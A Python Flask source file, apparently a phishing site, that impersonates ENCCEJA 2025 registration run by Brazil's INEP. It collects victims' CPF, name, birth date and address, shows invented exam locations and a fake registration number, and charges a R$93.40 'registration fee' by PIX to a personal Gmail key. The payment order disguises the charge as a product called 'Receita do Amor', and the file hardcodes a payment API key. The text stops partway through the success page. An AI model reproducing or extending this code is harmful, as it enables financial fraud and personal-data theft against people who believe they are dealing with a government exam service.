#!/usr/bin/env python3
"""
ENCCEJA 2025 - Aplicação Final Limpa para VPS
Fluxo exato da Replit + APIs funcionais + Sem SMS + Só WitePay
"""

import os
import sys
import functools
import time
import re
import random
import string
import logging
import urllib.parse
import base64
from datetime import datetime
from io import BytesIO
import secrets
import requests

# Configuração de encoding UTF-8
if sys.version_info[0] >= 3:
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

from flask import Flask, render_template, request, jsonify, redirect, url_for, session

app = Flask(__name__)

# Domínio autorizado - Permitindo todos os domínios para VPS
AUTHORIZED_DOMAIN = "*"

def check_referer(f):
    @functools.wraps(f)
    def decorated_function(*args, **kwargs):
        app.logger.info(f"Permitindo acesso para a rota: {request.path}")
        return f(*args, **kwargs)
    return decorated_function

# Se não existir SESSION_SECRET, gera um valor aleatório seguro
if not os.environ.get("SESSION_SECRET"):
    os.environ["SESSION_SECRET"] = secrets.token_hex(32)

app.secret_key = os.environ.get("SESSION_SECRET")

# Configurar logging
logging.basicConfig(level=logging.INFO)

def generate_qr_code(pix_code: str) -> str:
    """Gera QR code com tratamento de erro"""
    try:
        import qrcode
        from qrcode import constants
        
        qr = qrcode.QRCode(
            version=1,
            error_correction=constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data(pix_code)
        qr.make(fit=True)

        img = qr.make_image(fill_color="black", back_color="white")
        buffered = BytesIO()
        img.save(buffered, format="PNG")
        img_str = base64.b64encode(buffered.getvalue()).decode()
        return f"data:image/png;base64,{img_str}"
    except ImportError:
        app.logger.warning("QRCode library not available, returning empty")
        return ""
    except Exception as e:
        app.logger.error(f"Erro ao gerar QR code: {e}")
        return ""

def create_witepay_payment(user_data: dict, amount: float = 93.40) -> dict:
    """Cria pagamento WitePay com fallback para PIX direto"""
    try:
        # Tentar usar WitePay primeiro
        witepay_key = os.environ.get('WITEPAY_API_KEY', 'sk_3a164e1c15db06cc76116b861fb4b0c482ab857dbd53f43d')
        
        # Dados para WitePay
        order_data = {
            "productData": [{
                "name": "Receita do Amor",
                "value": int(amount * 100)  # Valor em centavos
            }],
            "clientData": {
                "clientName": user_data.get('nome', 'Cliente ENCCEJA'),
                "clientDocument": user_data.get('cpf', '00000000000'),
                "clientEmail": 'gerarpagamentos@gmail.com',
                "clientPhone": '11987790088'
            }
        }
        
        headers = {
            'x-api-key': witepay_key,
            'Content-Type': 'application/json'
        }
        
        # Criar pedido
        response = requests.post(
            'https://api.witepay.com.br/v1/order/create',
            headers=headers,
            json=order_data,
            timeout=10
        )
        
        if response.status_code == 200:
            order_result = response.json()
            order_id = order_result.get('orderId')
            
            if order_id:
                # Criar cobrança PIX
                charge_data = {"paymentMethod": "pix"}
                
                charge_response = requests.post(
                    f'https://api.witepay.com.br/v1/charge/create/{order_id}',
                    headers=headers,
                    json=charge_data,
                    timeout=10
                )
                
                if charge_response.status_code == 200:
                    charge_result = charge_response.json()
                    pix_code = charge_result.get('pixCode') or charge_result.get('qr_code')
                    
                    if pix_code:
                        transaction_id = charge_result.get('chargeId', f"ENCCEJA{int(time.time())}")
                        
                        app.logger.info(f"WitePay PIX gerado com sucesso - ID: {transaction_id}")
                        
                        return {
                            'success': True,
                            'pixCode': pix_code,
                            'transactionId': transaction_id,
                            'amount': amount,
                            'method': 'witepay'
                        }
        
        app.logger.warning("WitePay não funcionou, usando fallback PIX")
        
    except Exception as e:
        app.logger.warning(f"Erro no WitePay, usando fallback: {e}")
    
    # Fallback: Gerar PIX direto com chave gerarpagamentos@gmail.com
    transaction_id = f"ENCCEJA{int(time.time())}"
    pix_key = "gerarpagamentos@gmail.com"
    merchant_name = "Receita do Amor - ENCCEJA"
    merchant_city = "SAO PAULO"
    
    # Construir codigo PIX padrao Banco Central
    pix_base = f"00020126830014br.gov.bcb.pix2561{pix_key}52040000530398654{int(amount*100):02d}5925{merchant_name}6009{merchant_city}62{len(transaction_id):02d}{transaction_id}6304"
    
    # Calcular CRC16
    def calculate_crc16(data):
        crc = 0xFFFF
        for byte in data.encode('utf-8'):
            crc ^= byte << 8
            for _ in range(8):
                if crc & 0x8000:
                    crc = (crc << 1) ^ 0x1021
                else:
                    crc <<= 1
                crc &= 0xFFFF
        return f"{crc:04X}"
    
    crc = calculate_crc16(pix_base + "6304")
    pix_code_final = pix_base + "6304" + crc
    
    app.logger.info(f"PIX fallback gerado com sucesso - ID: {transaction_id}")
    
    return {
        'success': True,
        'pixCode': pix_code_final,
        'transactionId': transaction_id,
        'amount': amount,
        'method': 'fallback'
    }

# === ROTAS PRINCIPAIS ===

@app.route('/')
@app.route('/index')
@check_referer
def index():
    """Página principal - redireciona para /inscricao"""
    return redirect(url_for('inscricao'))

@app.route('/inscricao')
@check_referer
def inscricao():
    """Página de inscrição inicial - renderiza template original ou fallback"""
    app.logger.info("Renderizando página de inscrição")
    try:
        return render_template('inscricao.html')
    except Exception as e:
        app.logger.error(f"Erro ao renderizar inscricao.html: {e}")
        # Fallback HTML simples que SEGUE O FLUXO DA REPLIT
        return '''
        <!DOCTYPE html>
        <html lang="pt-BR">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>ENCCEJA 2025 - Inscrição</title>
            <style>
                body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; background: #f5f5f5; }
                .header { background: #0066cc; color: white; padding: 20px; text-align: center; border-radius: 10px; margin-bottom: 20px; }
                .form-box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                .form-group { margin: 20px 0; }
                label { display: block; margin-bottom: 8px; font-weight: bold; color: #333; }
                input[type="text"] { width: 100%; padding: 12px; font-size: 16px; border: 2px solid #ddd; border-radius: 5px; }
                .btn { background: #28a745; color: white; padding: 15px 30px; font-size: 16px; border: none; cursor: pointer; border-radius: 5px; width: 100%; }
                .btn:hover { background: #218838; }
                .loading { display: none; color: #007bff; margin: 10px 0; }
                .resultado { margin: 20px 0; padding: 15px; border-radius: 5px; }
                .success { background: #d4edda; border: 1px solid #c3e6cb; color: #155724; }
                .error { background: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; }
                .captcha-info { background: #e3f2fd; padding: 15px; border-radius: 5px; margin: 15px 0; }
                .continue-btn { background: #007bff; color: white; padding: 12px 25px; text-decoration: none; border-radius: 5px; display: inline-block; margin-top: 15px; }
            </style>
        </head>
        <body>
            <div class="header">
                <h1>ENCCEJA 2025</h1>
                <p>Exame Nacional para Certificação de Competências de Jovens e Adultos</p>
            </div>
            
            <div class="form-box">
                <h2>Consultar CPF</h2>
                <form id="cpfForm" onsubmit="consultarCPF(event)">
                    <div class="form-group">
                        <label>Digite seu CPF:</label>
                        <input type="text" id="cpfInput" placeholder="000.000.000-00" maxlength="14" required>
                    </div>
                    
                    <div class="captcha-info">
                        <p><strong>Informação:</strong> Após consultar o CPF, você será direcionado para as próximas etapas do processo de inscrição.</p>
                    </div>
                    
                    <button type="submit" class="btn">Consultar CPF</button>
                    <div class="loading" id="loading">Consultando dados na base oficial...</div>
                </form>
                
                <div id="resultado"></div>
            </div>
            
            <script>
            function formatarCPF(cpf) {
                return cpf.replace(/(\\d{3})(\\d{3})(\\d{3})(\\d{2})/, '$1.$2.$3-$4');
            }
            
            document.getElementById('cpfInput').oninput = function(e) {
                let value = e.target.value.replace(/\\D/g, '');
                if (value.length <= 11) {
                    e.target.value = formatarCPF(value);
                }
            };
            
            function consultarCPF(event) {
                event.preventDefault();
                
                const cpfInput = document.getElementById('cpfInput');
                const loading = document.getElementById('loading');
                const resultado = document.getElementById('resultado');
                
                const cpf = cpfInput.value.replace(/\\D/g, '');
                
                if (cpf.length !== 11) {
                    alert('CPF deve ter 11 dígitos');
                    return;
                }
                
                loading.style.display = 'block';
                resultado.innerHTML = '';
                
                fetch('/consultar-cpf-inscricao?cpf=' + cpf)
                .then(response => response.json())
                .then(data => {
                    loading.style.display = 'none';
                    if (data.sucesso) {
                        resultado.innerHTML = 
                            '<div class="resultado success">' +
                            '<h3>CPF Encontrado!</h3>' +
                            '<p><strong>Nome:</strong> ' + data.nome + '</p>' +
                            '<p><strong>CPF:</strong> ' + data.cpf + '</p>' +
                            '<p><strong>Data Nascimento:</strong> ' + data.dataNascimento + '</p>' +
                            '<a href="/encceja-info" class="continue-btn">Continuar Inscrição</a>' +
                            '</div>';
                    } else {
                        resultado.innerHTML = '<div class="resultado error"><strong>Erro:</strong> ' + data.error + '</div>';
                    }
                })
                .catch(error => {
                    loading.style.display = 'none';
                    resultado.innerHTML = '<div class="resultado error"><strong>Erro na consulta:</strong> Tente novamente</div>';
                    console.error('Erro:', error);
                });
            }
            </script>
        </body>
        </html>
        '''

@app.route('/encceja-info')
@check_referer
def encceja_info():
    """Informações sobre o ENCCEJA"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("Renderizando encceja-info")
    try:
        return render_template('encceja-info.html', user_data=session['user_data'])
    except Exception as e:
        app.logger.error(f"Erro ao renderizar template: {e}")
        user_data = session['user_data']
        return f'''
        <!DOCTYPE html>
        <html lang="pt-BR">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>ENCCEJA 2025 - Informações</title>
            <style>
                body {{ font-family: Arial, sans-serif; max-width: 700px; margin: 30px auto; padding: 20px; background: #f5f5f5; }}
                .header {{ background: #0066cc; color: white; padding: 25px; text-align: center; border-radius: 10px; margin-bottom: 25px; }}
                .info-box {{ background: white; padding: 25px; margin: 20px 0; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
                .user-info {{ background: #e8f4fd; border-left: 5px solid #0066cc; padding: 20px; margin: 20px 0; }}
                .btn {{ background: #28a745; color: white; padding: 15px 30px; text-decoration: none; display: inline-block; margin: 15px 5px 0 0; border-radius: 5px; font-size: 16px; }}
                .btn:hover {{ background: #218838; }}
                .encceja-details {{ background: #fff3cd; border: 1px solid #ffeaa7; padding: 20px; border-radius: 5px; margin: 20px 0; }}
                .highlight {{ color: #d73527; font-weight: bold; font-size: 18px; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>ENCCEJA 2025</h1>
                <p>Exame Nacional para Certificação de Competências de Jovens e Adultos</p>
            </div>
            
            <div class="info-box">
                <div class="user-info">
                    <h3>Dados do Candidato</h3>
                    <p><strong>Nome:</strong> {user_data.get('nome', 'N/A')}</p>
                    <p><strong>CPF:</strong> {user_data.get('cpf', 'N/A')}</p>
                    <p><strong>Data de Nascimento:</strong> {user_data.get('dataNascimento', 'N/A')}</p>
                    <p><strong>Situação:</strong> Apto para inscrição</p>
                </div>
                
                <div class="encceja-details">
                    <h3>Sobre o ENCCEJA 2025</h3>
                    <p>O Exame Nacional para Certificação de Competências de Jovens e Adultos (ENCCEJA) é realizado pelo Instituto Nacional de Estudos e Pesquisas Educacionais Anísio Teixeira (INEP).</p>
                    
                    <p><strong>Objetivo:</strong> Certificar competências, habilidades e saberes de jovens e adultos que não concluíram o ensino fundamental ou médio na idade apropriada.</p>
                    
                    <p class="highlight">Taxa de Inscrição: R$ 93,40</p>
                    
                    <p><strong>Modalidades disponíveis:</strong></p>
                    <ul>
                        <li>Ensino Fundamental (para maiores de 15 anos)</li>
                        <li>Ensino Médio (para maiores de 18 anos)</li>
                    </ul>
                    
                    <p><strong>Áreas de Conhecimento avaliadas:</strong></p>
                    <ul>
                        <li>Língua Portuguesa, Língua Estrangeira Moderna, Artes e Educação Física</li>
                        <li>Matemática</li>
                        <li>História e Geografia</li>
                        <li>Ciências Naturais</li>
                    </ul>
                </div>
                
                <p><strong>Próximo passo:</strong> Validar seus dados pessoais e prosseguir com a inscrição.</p>
                
                <a href="/validar-dados" class="btn">Validar Dados e Continuar</a>
            </div>
        </body>
        </html>
        '''

@app.route('/validar-dados')
@check_referer
def validar_dados():
    """Validação de dados pessoais"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("Renderizando validar-dados")
    try:
        return render_template('validar-dados.html', user_data=session['user_data'])
    except Exception as e:
        app.logger.error(f"Erro ao renderizar template: {e}")
        user_data = session['user_data']
        return f'''
        <!DOCTYPE html>
        <html lang="pt-BR">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>ENCCEJA 2025 - Validar Dados</title>
            <style>
                body {{ font-family: Arial, sans-serif; max-width: 600px; margin: 30px auto; padding: 20px; background: #f5f5f5; }}
                .header {{ background: #0066cc; color: white; padding: 25px; text-align: center; border-radius: 10px; margin-bottom: 25px; }}
                .form-box {{ background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
                .form-group {{ margin: 20px 0; }}
                label {{ display: block; margin-bottom: 8px; font-weight: bold; color: #333; }}
                input {{ width: 100%; padding: 12px; font-size: 16px; border: 2px solid #ddd; border-radius: 5px; background: #f9f9f9; }}
                .btn {{ background: #28a745; color: white; padding: 15px 30px; border: none; cursor: pointer; border-radius: 5px; font-size: 16px; width: 100%; }}
                .btn:hover {{ background: #218838; }}
                .readonly {{ background: #e9ecef; color: #6c757d; }}
                .info {{ background: #e3f2fd; padding: 15px; border-radius: 5px; margin: 20px 0; color: #1565c0; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>Validar Dados Pessoais</h1>
                <p>Confirme suas informações para prosseguir</p>
            </div>
            
            <div class="form-box">
                <div class="info">
                    <strong>Importante:</strong> Verifique se todos os dados estão corretos. Estas informações serão utilizadas para emissão do certificado.
                </div>
                
                <form method="POST" action="/salvar-validacao">
                    <div class="form-group">
                        <label>Nome Completo:</label>
                        <input type="text" name="nome" value="{user_data.get('nome', '')}" class="readonly" readonly>
                    </div>
                    
                    <div class="form-group">
                        <label>CPF:</label>
                        <input type="text" name="cpf" value="{user_data.get('cpf', '')}" class="readonly" readonly>
                    </div>
                    
                    <div class="form-group">
                        <label>Data de Nascimento:</label>
                        <input type="text" name="data_nascimento" value="{user_data.get('dataNascimento', '')}" class="readonly" readonly>
                    </div>
                    
                    <div class="form-group">
                        <label>Situação Cadastral:</label>
                        <input type="text" value="REGULAR" class="readonly" readonly>
                    </div>
                    
                    <button type="submit" class="btn">Confirmar e Continuar</button>
                </form>
            </div>
        </body>
        </html>
        '''

@app.route('/salvar-validacao', methods=['POST'])
@check_referer
def salvar_validacao():
    """Salvar validação e ir para endereco"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("Dados validados, redirecionando para endereco")
    return redirect(url_for('endereco'))

@app.route('/endereco')
@check_referer
def endereco():
    """Formulario de endereco"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("Renderizando endereco")
    try:
        return render_template('endereco.html')
    except Exception as e:
        app.logger.error(f"Erro ao renderizar template: {e}")
        return '''
        <!DOCTYPE html>
        <html lang="pt-BR">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>ENCCEJA 2025 - Endereço</title>
            <style>
                body { font-family: Arial, sans-serif; max-width: 600px; margin: 30px auto; padding: 20px; background: #f5f5f5; }
                .header { background: #0066cc; color: white; padding: 25px; text-align: center; border-radius: 10px; margin-bottom: 25px; }
                .form-box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                .form-group { margin: 20px 0; }
                label { display: block; margin-bottom: 8px; font-weight: bold; color: #333; }
                input, select { width: 100%; padding: 12px; font-size: 16px; border: 2px solid #ddd; border-radius: 5px; }
                .btn { background: #28a745; color: white; padding: 15px 30px; border: none; cursor: pointer; border-radius: 5px; font-size: 16px; width: 100%; }
                .btn:hover { background: #218838; }
                .info { background: #fff3cd; padding: 15px; border-radius: 5px; margin: 20px 0; color: #856404; }
            </style>
        </head>
        <body>
            <div class="header">
                <h1>Dados de Endereço</h1>
                <p>Informe seu endereço atual</p>
            </div>
            
            <div class="form-box">
                <div class="info">
                    <strong>Importante:</strong> O endereço será usado para definir o local de prova mais próximo de você.
                </div>
                
                <form method="POST" action="/salvar-endereco">
                    <div class="form-group">
                        <label>CEP: <span style="color: red;">*</span></label>
                        <input type="text" name="cep" placeholder="00000-000" maxlength="9" required>
                    </div>
                    
                    <div class="form-group">
                        <label>Cidade: <span style="color: red;">*</span></label>
                        <input type="text" name="cidade" placeholder="Nome da sua cidade" required>
                    </div>
                    
                    <div class="form-group">
                        <label>Estado (UF): <span style="color: red;">*</span></label>
                        <select name="uf" required>
                            <option value="">Selecione seu estado...</option>
                            <option value="AC">Acre</option>
                            <option value="AL">Alagoas</option>
                            <option value="AP">Amapá</option>
                            <option value="AM">Amazonas</option>
                            <option value="BA">Bahia</option>
                            <option value="CE">Ceará</option>
                            <option value="DF">Distrito Federal</option>
                            <option value="ES">Espírito Santo</option>
                            <option value="GO">Goiás</option>
                            <option value="MA">Maranhão</option>
                            <option value="MT">Mato Grosso</option>
                            <option value="MS">Mato Grosso do Sul</option>
                            <option value="MG">Minas Gerais</option>
                            <option value="PA">Pará</option>
                            <option value="PB">Paraíba</option>
                            <option value="PR">Paraná</option>
                            <option value="PE">Pernambuco</option>
                            <option value="PI">Piauí</option>
                            <option value="RJ">Rio de Janeiro</option>
                            <option value="RN">Rio Grande do Norte</option>
                            <option value="RS">Rio Grande do Sul</option>
                            <option value="RO">Rondônia</option>
                            <option value="RR">Roraima</option>
                            <option value="SC">Santa Catarina</option>
                            <option value="SP">São Paulo</option>
                            <option value="SE">Sergipe</option>
                            <option value="TO">Tocantins</option>
                        </select>
                    </div>
                    
                    <button type="submit" class="btn">Continuar</button>
                </form>
            </div>
            
            <script>
            // Máscara para CEP
            document.querySelector('input[name="cep"]').addEventListener('input', function(e) {
                let value = e.target.value.replace(/\\D/g, '');
                if (value.length > 5) {
                    value = value.replace(/^(\\d{5})(\\d{3}).*/, '$1-$2');
                }
                e.target.value = value;
            });
            </script>
        </body>
        </html>
        '''

@app.route('/salvar-endereco', methods=['POST'])
@check_referer
def salvar_endereco():
    """Salvar endereco na sessao"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    endereco_data = {
        'cep': request.form.get('cep', '01000-000'),
        'cidade': request.form.get('cidade', 'São Paulo'),
        'uf': request.form.get('uf', 'SP')
    }
    
    session['endereco_data'] = endereco_data
    app.logger.info(f"Endereço salvo: {endereco_data['cidade']}")
    
    return redirect(url_for('local_prova'))

@app.route('/local-prova')
@check_referer
def local_prova():
    """Selecao do local de prova"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("Renderizando local-prova")
    try:
        return render_template('local-prova.html')
    except Exception as e:
        app.logger.error(f"Erro ao renderizar template: {e}")
        endereco = session.get('endereco_data', {})
        return f'''
        <!DOCTYPE html>
        <html lang="pt-BR">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>ENCCEJA 2025 - Local de Prova</title>
            <style>
                body {{ font-family: Arial, sans-serif; max-width: 600px; margin: 30px auto; padding: 20px; background: #f5f5f5; }}
                .header {{ background: #0066cc; color: white; padding: 25px; text-align: center; border-radius: 10px; margin-bottom: 25px; }}
                .form-box {{ background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
                .form-group {{ margin: 20px 0; }}
                label {{ display: block; margin-bottom: 8px; font-weight: bold; color: #333; }}
                select {{ width: 100%; padding: 12px; font-size: 16px; border: 2px solid #ddd; border-radius: 5px; }}
                .btn {{ background: #28a745; color: white; padding: 15px 30px; border: none; cursor: pointer; border-radius: 5px; font-size: 16px; width: 100%; }}
                .btn:hover {{ background: #218838; }}
                .location-info {{ background: #e3f2fd; padding: 15px; border-radius: 5px; margin: 20px 0; color: #1565c0; }}
                .warning {{ background: #fff3cd; padding: 15px; border-radius: 5px; margin: 20px 0; color: #856404; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>Selecionar Local de Prova</h1>
                <p>Escolha o local mais próximo para realizar o exame</p>
            </div>
            
            <div class="form-box">
                <div class="location-info">
                    <strong>Seu endereço:</strong> {endereco.get('cidade', 'Não informado')}, {endereco.get('uf', 'N/A')}
                </div>
                
                <form method="POST" action="/salvar-local">
                    <div class="form-group">
                        <label>Escolha o local de prova mais próximo: <span style="color: red;">*</span></label>
                        <select name="local" required>
                            <option value="">Selecione um local...</option>
                            <option value="escola1">Escola Municipal Prof. Antonio Silva - Centro</option>
                            <option value="escola2">Escola Estadual Dr. José Santos - Bairro Jardim</option>
                            <option value="escola3">Centro Educacional Maria Oliveira - Zona Norte</option>
                            <option value="escola4">EMEF Carlos Drummond de Andrade - Vila Nova</option>
                            <option value="escola5">Colégio Estadual Paulo Freire - Distrito Industrial</option>
                        </select>
                    </div>
                    
                    <div class="warning">
                        <strong>Importante:</strong> O local final da prova será confirmado no cartão de inscrição. Caso necessário, o INEP pode alterar o local por questões logísticas.
                    </div>
                    
                    <button type="submit" class="btn">Continuar para Pagamento</button>
                </form>
            </div>
        </body>
        </html>
        '''

@app.route('/salvar-local', methods=['POST'])
@check_referer
def salvar_local():
    """Salvar local de prova"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    local = request.form.get('local', 'escola1')
    session['local_prova'] = local
    app.logger.info(f"Local salvo: {local}")
    
    return redirect(url_for('pagamento'))

@app.route('/pagamento', methods=['GET', 'POST'])
@check_referer
def pagamento():
    """Página de pagamento PIX"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("Renderizando pagina de pagamento")
    try:
        return render_template('pagamento.html', user_data=session['user_data'])
    except Exception as e:
        app.logger.error(f"Erro ao renderizar template: {e}")
        user_data = session['user_data']
        return f'''
        <!DOCTYPE html>
        <html lang="pt-BR">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>ENCCEJA 2025 - Pagamento</title>
            <style>
                body {{ font-family: Arial, sans-serif; max-width: 600px; margin: 30px auto; padding: 20px; background: #f5f5f5; }}
                .header {{ background: #0066cc; color: white; padding: 25px; text-align: center; border-radius: 10px; margin-bottom: 25px; }}
                .payment-box {{ background: white; padding: 30px; margin: 20px 0; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
                .summary {{ background: #e8f4fd; border-left: 5px solid #0066cc; padding: 20px; margin: 20px 0; }}
                .btn {{ background: #28a745; color: white; padding: 15px 30px; border: none; cursor: pointer; border-radius: 5px; font-size: 16px; width: 100%; }}
                .btn:hover {{ background: #218838; }}
                .loading {{ display: none; color: #007bff; text-align: center; margin: 15px 0; }}
                .qr-result {{ margin: 20px 0; padding: 20px; background: #fff; border: 2px solid #28a745; border-radius: 10px; }}
                .pix-code {{ background: #f8f9fa; padding: 15px; border: 1px solid #ddd; border-radius: 5px; font-family: monospace; font-size: 12px; word-break: break-all; margin: 15px 0; }}
                .success-btn {{ background: #007bff; color: white; padding: 12px 25px; text-decoration: none; border-radius: 5px; display: inline-block; margin-top: 15px; }}
                .highlight {{ color: #d73527; font-weight: bold; font-size: 18px; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>Pagamento da Inscrição</h1>
                <p>ENCCEJA 2025 - Taxa de Inscrição</p>
            </div>
            
            <div class="payment-box">
                <div class="summary">
                    <h3>Resumo da Inscrição</h3>
                    <p><strong>Candidato:</strong> {user_data.get('nome', 'N/A')}</p>
                    <p><strong>CPF:</strong> {user_data.get('cpf', 'N/A')}</p>
                    <p><strong>Exame:</strong> ENCCEJA 2025</p>
                    <p class="highlight">Valor: R$ 93,40</p>
                    <p><strong>Descrição:</strong> Taxa de Inscrição ENCCEJA 2025 - Certificação de Competências</p>
                </div>
                
                <h3>Pagamento via PIX</h3>
                <p>Clique no botão abaixo para gerar o código PIX e efetuar o pagamento da inscrição.</p>
                
                <button onclick="gerarPix()" class="btn">Gerar Código PIX</button>
                <div class="loading" id="loading">
                    <p>🔄 Gerando código PIX...</p>
                    <p>Aguarde alguns instantes...</p>
                </div>
                
                <div id="qr-result"></div>
            </div>
            
            <script>
            function gerarPix() {{
                const loading = document.getElementById('loading');
                const result = document.getElementById('qr-result');
                const btn = document.querySelector('button');
                
                btn.disabled = true;
                btn.textContent = 'Gerando...';
                loading.style.display = 'block';
                result.innerHTML = '';
                
                fetch('/criar-pagamento-pix', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{}})
                }})
                .then(response => response.json())
                .then(data => {{
                    loading.style.display = 'none';
                    btn.disabled = false;
                    btn.textContent = 'Gerar Novo Código PIX';
                    
                    if (data.success) {{
                        result.innerHTML = 
                            '<div class="qr-result">' +
                            '<h4>✅ Código PIX Gerado com Sucesso!</h4>' +
                            '<p><strong>Valor:</strong> R$ ' + data.amount.toFixed(2) + '</p>' +
                            '<p><strong>ID da Transação:</strong> ' + data.transactionId + '</p>' +
                            '<p><strong>Método:</strong> ' + (data.method === 'witepay' ? 'WitePay API' : 'PIX Direto') + '</p>' +
                            '<div class="pix-code">' +
                            '<strong>Código PIX:</strong><br>' +
                            '<textarea readonly style="width:100%; height:100px; font-size:12px; font-family:monospace;">' + data.pixCode + '</textarea>' +
                            '</div>' +
                            '<p><strong>Instruções:</strong></p>' +
                            '<ul>' +
                            '<li>Copie o código PIX acima</li>' +
                            '<li>Abra o aplicativo do seu banco</li>' +
                            '<li>Escolha a opção "PIX Copia e Cola"</li>' +
                            '<li>Cole o código e confirme o pagamento</li>' +
                            '</ul>' +
                            '<a href="/inscricao-sucesso" class="success-btn">Finalizar Inscrição</a>' +
                            '</div>';
                    }} else {{
                        result.innerHTML = '<div style="color:red; text-align:center; padding:20px;"><strong>❌ Erro:</strong> ' + data.error + '</div>';
                    }}
                }})
                .catch(error => {{
                    loading.style.display = 'none';
                    btn.disabled = false;
                    btn.textContent = 'Gerar Código PIX';
                    result.innerHTML = '<div style="color:red; text-align:center; padding:20px;"><strong>❌ Erro na geração do PIX</strong><br>Tente novamente</div>';
                    console.error('Erro:', error);
                }});
            }}
            </script>
        </body>
        </html>
        '''

@app.route('/inscricao-sucesso')
@check_referer
def inscricao_sucesso():
    """Pagina de sucesso"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("Renderizando inscricao-sucesso")
    try:
        return render_template('inscricao-sucesso.html', user_data=session['user_data'])
    except Exception as e:
        app.logger.error(f"Erro ao renderizar template: {e}")
        user_data = session['user_data']
        endereco = session.get('endereco_data', {})
        local_prova = session.get('local_prova', 'escola1')
        
        return f'''
        <!DOCTYPE html>
        <html lang="pt-BR">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>ENCCEJA 2025 - Inscrição Concluída</title>
            <style>
                body {{ font-family: Arial, sans-serif; max-width: 700px; margin: 30px auto; padding: 20px; background: #f5f5f5; }}
                .header {{ background: #28a745; color: white; padding: 25px; text-align: center; border-radius: 10px; margin-bottom: 25px; }}
                .success-box {{ background: white; padding: 30px; margin: 20px 0; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
                .celebration {{ background: #d4edda; border: 2px solid #c3e6cb; padding: 25px; border-radius: 10px; text-align: center; margin: 20px 0; }}
                .info-grid {{ display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 25px 0; }}
                .info-item {{ background: #f8f9fa; padding: 15px; border-radius: 5px; }}
                .next-steps {{ background: #fff3cd; border: 1px solid #ffeaa7; padding: 20px; border-radius: 5px; margin: 20px 0; }}
                .contact-info {{ background: #e3f2fd; padding: 15px; border-radius: 5px; margin: 20px 0; }}
                .highlight {{ color: #d73527; font-weight: bold; }}
                .inep-logo {{ text-align: center; margin: 30px 0; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>🎉 Inscrição Realizada com Sucesso!</h1>
                <p>ENCCEJA 2025 - Certificação de Competências</p>
            </div>
            
            <div class="success-box">
                <div class="celebration">
                    <h2>Parabéns, {user_data.get('nome', 'Candidato')}!</h2>
                    <p>Sua inscrição no ENCCEJA 2025 foi processada com sucesso.</p>
                    <p class="highlight">Número da Inscrição: ENCCEJA{int(time.time())}</p>
                </div>
                
                <h3>Dados da Inscrição</h3>
                <div class="info-grid">
                    <div class="info-item">
                        <strong>Candidato:</strong><br>
                        {user_data.get('nome', 'N/A')}
                    </div>
                    <div class="info-item">
                        <strong>CPF:</strong><br>
                        {user_data.get('cpf', 'N/A')}
                    </div>
                    <div class="info-item">
                        <strong>Data de Nascimento:</strong><br>
                        {user_data.get('dataNascimento', 'N/A')}
                    </div>
                    <div class="info-item">
                        <strong>Cidade:</strong><br>
                        {endereco.get('cidade', 'N/A')}, {endereco.get('uf', 'N/A')}
                    </div>
                </div>
                
                <div class="next-steps">
                    <h3>📋 Próximos Passos</h3>
                    <ol>
                        <li><strong>Aguarde o cartão de confirmação</strong> - Será enviado até 7 dias antes da prova</li>
                        <li><strong>Verifique local e horário</strong> - As informações estarão no cartão de confirmação</li>
                        <li><strong>Prepare-se para o exame</strong> - Revise os conteúdos das áreas de conhecimento</li>
                        <li><strong>No dia da prova</strong> - Leve documento oficial com foto e caneta esferográfica azul ou preta</li>
                    </ol>
                </div>
                
                <div class="contact-info">
                    <h3>📞 Informações e Suporte</h3>
                    <p><strong>Site Oficial:</strong> <a href="https://www.gov.br/inep/pt-br/areas-de-atuacao/avaliacao-e-exames-educacionais/encceja" target="_blank">gov.br/inep</a></p>
                    <p><strong>Telefone:</strong> 0800 616 161</p>
                    <p><strong>Horário:</strong> Segunda a sexta, das 8h às 20h</p>
                </div>
                
                <div class="inep-logo">
